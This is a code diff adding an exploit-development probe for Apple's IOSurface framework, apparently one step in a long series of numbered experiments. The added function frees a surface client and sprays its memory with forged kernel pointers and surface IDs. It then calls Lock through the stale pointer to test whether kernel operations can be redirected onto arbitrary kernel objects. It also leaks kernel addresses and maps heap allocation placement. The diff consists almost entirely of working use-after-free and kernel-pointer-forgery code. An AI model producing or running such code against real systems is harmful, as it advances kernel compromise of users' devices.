@@ -15902,6 +15902,241 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r377: Three-surface disambiguation — does Lock use +88 (kptr) or +136 (sid)?
+ * Setup: surfaces A, B, C. Free A, spray with +88=C's kptr, +136=B's sid.
+ * Lock through stale pointer. If B's seed changes → Lock uses sid (+136).
+ * If C's seed changes → Lock uses kptr (+88). This determines if we can
+ * redirect Lock to operate on ANY kernel object by controlling +88.
+ *
+ * Also test: what if +88 points to a DIFFERENT kernel heap address
+ * (not a surface at all)? Would Lock follow it and corrupt that memory?
+ */
+static void r377_probe(void) {
+    rlog("\n=== r377: Three-Surface Lock Disambiguation ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef void (*clientSetValue_t)(IOSurfaceClientRef, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*clientCopyValue_t)(IOSurfaceClientRef, CFStringRef);
+    typedef int (*clientLock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef int (*clientUnlock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientSetValue_t clSetValue = (clientSetValue_t)dlsym(iosurfH, "IOSurfaceClientSetValue");
+    clientCopyValue_t clCopyValue = (clientCopyValue_t)dlsym(iosurfH, "IOSurfaceClientCopyValue");
+    clientLock_t clLock = (clientLock_t)dlsym(iosurfH, "IOSurfaceClientLock");
+    clientUnlock_t clUnlock = (clientUnlock_t)dlsym(iosurfH, "IOSurfaceClientUnlock");
+
+    if (!clLookup || !clRelease || !clLock) {
+        rlog("  FATAL: missing APIs\n");
+        goto r377_done;
+    }
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFStringRef kW = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kH = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kB = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kR = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kP = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef kA = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFStringRef keys377[] = {kW, kH, kB, kR, kP, kA};
+    CFTypeRef vals377[] = {nW, nH, nB, nR, nP, nA};
+    CFDictionaryRef crprops = CFDictionaryCreate(NULL,
+        (const void**)keys377, (const void**)vals377, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    IOSurfaceRef surf_a = IOSurfaceCreate(crprops);
+    IOSurfaceRef surf_b = IOSurfaceCreate(crprops);
+    IOSurfaceRef surf_c = IOSurfaceCreate(crprops);
+    if (!surf_a || !surf_b || !surf_c) { rlog("  FATAL\n"); goto r377_cfree; }
+
+    uint32_t sid_a = IOSurfaceGetID(surf_a);
+    uint32_t sid_b = IOSurfaceGetID(surf_b);
+    uint32_t sid_c = IOSurfaceGetID(surf_c);
+    IOSurfaceClientRef cl_a = clLookup(sid_a);
+    IOSurfaceClientRef cl_b = clLookup(sid_b);
+    IOSurfaceClientRef cl_c = clLookup(sid_c);
+
+    uint8_t *raw_a = (uint8_t*)cl_a;
+    uint8_t *raw_b = (uint8_t*)cl_b;
+    uint8_t *raw_c = (uint8_t*)cl_c;
+    uint64_t kptr_a, kptr_b, kptr_c;
+    memcpy(&kptr_a, raw_a + 88, 8);
+    memcpy(&kptr_b, raw_b + 88, 8);
+    memcpy(&kptr_c, raw_c + 88, 8);
+    rlog("  A: ID=%u kptr=0x%llx cl=%p\n", sid_a, (unsigned long long)kptr_a, cl_a);
+    rlog("  B: ID=%u kptr=0x%llx cl=%p\n", sid_b, (unsigned long long)kptr_b, cl_b);
+    rlog("  C: ID=%u kptr=0x%llx cl=%p\n", sid_c, (unsigned long long)kptr_c, cl_c);
+
+    uint32_t seed_b0 = IOSurfaceGetSeed(surf_b);
+    uint32_t seed_c0 = IOSurfaceGetSeed(surf_c);
+    rlog("  B seed=%u, C seed=%u (before)\n", seed_b0, seed_c0);
+
+    /* ---- UAF: free A, spray with +88=C's kptr, +136=B's sid ---- */
+    rlog("\n--- Part 1: Disambiguate Lock (+88=C, +136=B) ---\n");
+    fflush(stdout);
+
+    uint8_t saved[448];
+    memcpy(saved, raw_a, 448);
+
+    clRelease(cl_a);
+    CFRelease(surf_a);
+    surf_a = NULL;
+    cl_a = NULL;
+
+    /* Forge: +88 → C's kptr, +136 → B's sid */
+    memcpy(saved + 88, &kptr_c, 8);
+    memcpy(saved + 136, &sid_b, 4);
+
+    malloc_zone_t *zone = malloc_default_zone();
+    uint8_t *spray[8] = {0};
+    for (int i = 0; i < 8; i++) {
+        spray[i] = (uint8_t*)malloc_zone_malloc(zone, 448);
+        memcpy(spray[i], saved, 448);
+    }
+
+    uint64_t check88;
+    uint32_t check136;
+    memcpy(&check88, raw_a + 88, 8);
+    memcpy(&check136, raw_a + 136, 4);
+    rlog("  Stale +88=0x%llx (expect C's 0x%llx)\n",
+        (unsigned long long)check88, (unsigned long long)kptr_c);
+    rlog("  Stale +136=%u (expect B's %u)\n", check136, sid_b);
+
+    int spray_ok = (check88 == kptr_c && check136 == sid_b);
+    rlog("  Spray: %s\n", spray_ok ? "HIT" : "MISS");
+
+    if (!spray_ok) {
+        rlog("  Spray missed, aborting\n");
+        goto r377_cleanup;
+    }
+
+    /* Lock through stale pointer */
+    uint32_t seed_out = 0;
+    int lret = clLock(raw_a, 0, &seed_out);
+    rlog("  Lock(stale) = %d seed_out=%u\n", lret, seed_out);
+
+    uint32_t seed_b1 = IOSurfaceGetSeed(surf_b);
+    uint32_t seed_c1 = IOSurfaceGetSeed(surf_c);
+    rlog("  B seed=%u (was %u) %s\n", seed_b1, seed_b0,
+        seed_b1 != seed_b0 ? "CHANGED → Lock uses SID (+136)" : "same");
+    rlog("  C seed=%u (was %u) %s\n", seed_c1, seed_c0,
+        seed_c1 != seed_c0 ? "CHANGED → Lock uses KPTR (+88)!" : "same");
+
+    if (seed_c1 != seed_c0 && seed_b1 == seed_b0) {
+        rlog("\n  *** CRITICAL: Lock uses KPTR (+88) for kernel dispatch! ***\n");
+        rlog("  *** We can redirect Lock to operate on ANY kernel object! ***\n");
+    } else if (seed_b1 != seed_b0 && seed_c1 == seed_c0) {
+        rlog("\n  Lock uses SID (+136) — same path as CopyValue.\n");
+    } else if (seed_b1 != seed_b0 && seed_c1 != seed_c0) {
+        rlog("\n  BOTH changed — Lock may use both paths!\n");
+    } else {
+        rlog("\n  NEITHER changed — Lock may have failed silently.\n");
+    }
+
+    /* Unlock to clean up */
+    if (clUnlock && lret == 0) {
+        seed_out = 0;
+        clUnlock(raw_a, 0, &seed_out);
+    }
+
+    /* ---- Part 2: What does the IOSurface Mach message look like? ---- */
+    /* Read the internal io_connect_t from the client ref */
+    rlog("\n--- Part 2: IOKit connection analysis ---\n");
+    fflush(stdout);
+
+    /* Scan the 448-byte structure for Mach port values (small integers) */
+    rlog("  Scanning client ref for Mach port-like values:\n");
+    for (int off = 0; off < 448; off += 4) {
+        uint32_t val32;
+        memcpy(&val32, raw_b + off, 4);
+        if (val32 > 0x100 && val32 < 0x10000 && (val32 & 0x3) == 0x3) {
+            rlog("    +%d: 0x%x (possible Mach port)\n", off, val32);
+        }
+    }
+
+    /* ---- Part 3: Property size experiment ---- */
+    /* Can we get a kernel property allocation to land at a known kptr? */
+    rlog("\n--- Part 3: Kernel property allocation sizes ---\n");
+    fflush(stdout);
+
+    /* Create 10 surfaces, record kptrs, then set properties of varying sizes */
+    IOSurfaceRef psurfs[10] = {0};
+    uint64_t pkptrs[10] = {0};
+    for (int i = 0; i < 10; i++) {
+        psurfs[i] = IOSurfaceCreate(crprops);
+        if (psurfs[i]) {
+            uint32_t psid = IOSurfaceGetID(psurfs[i]);
+            IOSurfaceClientRef pcl = clLookup(psid);
+            if (pcl) {
+                memcpy(&pkptrs[i], (uint8_t*)pcl + 88, 8);
+                clRelease(pcl);
+            }
+        }
+    }
+
+    rlog("  10 surfaces kernel addresses:\n");
+    for (int i = 0; i < 10; i++) {
+        rlog("    [%d] 0x%llx", i, (unsigned long long)pkptrs[i]);
+        if (i > 0) rlog(" (delta=%lld)", (long long)(pkptrs[i] - pkptrs[i-1]));
+        rlog("\n");
+    }
+
+    /* Set a 448-byte property on surface 0, then create surface 10 */
+    CFStringRef kProp = CFStringCreateWithCString(NULL, "r377_data", kCFStringEncodingASCII);
+    uint8_t propdata[448];
+    memset(propdata, 0x41, 448);
+    CFDataRef dProp = CFDataCreate(NULL, propdata, 448);
+    IOSurfaceSetValue(psurfs[0], kProp, dProp);
+    CFRelease(dProp);
+
+    IOSurfaceRef extra = IOSurfaceCreate(crprops);
+    uint64_t extra_kptr = 0;
+    if (extra) {
+        uint32_t esid = IOSurfaceGetID(extra);
+        IOSurfaceClientRef ecl = clLookup(esid);
+        if (ecl) {
+            memcpy(&extra_kptr, (uint8_t*)ecl + 88, 8);
+            clRelease(ecl);
+        }
+    }
+    rlog("  After 448B property + 1 more surface:\n");
+    rlog("    extra kptr=0x%llx\n", (unsigned long long)extra_kptr);
+    rlog("    delta from [9]=0x%llx: %lld\n",
+        (unsigned long long)pkptrs[9],
+        (long long)(extra_kptr - pkptrs[9]));
+
+    /* Clean up part 3 */
+    for (int i = 0; i < 10; i++) if (psurfs[i]) CFRelease(psurfs[i]);
+    if (extra) CFRelease(extra);
+    CFRelease(kProp);
+
+r377_cleanup:
+    for (int i = 0; i < 8; i++) if (spray[i]) malloc_zone_free(zone, spray[i]);
+    if (cl_b) clRelease(cl_b);
+    if (cl_c) clRelease(cl_c);
+    if (surf_b) CFRelease(surf_b);
+    if (surf_c) CFRelease(surf_c);
+
+r377_cfree:
+    CFRelease(crprops);
+    CFRelease(kW); CFRelease(kH); CFRelease(kB); CFRelease(kR); CFRelease(kP); CFRelease(kA);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+r377_done:
+    if (iosurfH) dlclose(iosurfH);
+    rlog("\n=== r377 complete ===\n");
+    fflush(stdout);
+}
+
 /* r376: Kernel-side type confusion via kptr forgery.
  * Through our UAF spray, set +88 (kernel address) to a controlled value.
  * Call various IOSurface framework functions through the stale pointer.
@@ -57617,6 +57852,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 380) {
+            rlog("*** rounds=380: Three-Surface Lock Disambiguation ***\n");
+            rlog("  +88=C's kptr, +136=B's sid. Lock → check B vs C seed.\n");
+            rlog("  Determines if Lock uses kptr or sid for kernel dispatch.\n\n");
+            fflush(stdout);
+            r377_probe();
+            goto done;
+        }
         if (rounds == 379) {
             rlog("*** rounds=379: Kptr Forgery + Framework Function Probing ***\n");
             rlog("  Forge +88 (kptr) in UAF spray to B's kernel address.\n");
@@ -59860,7 +60103,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
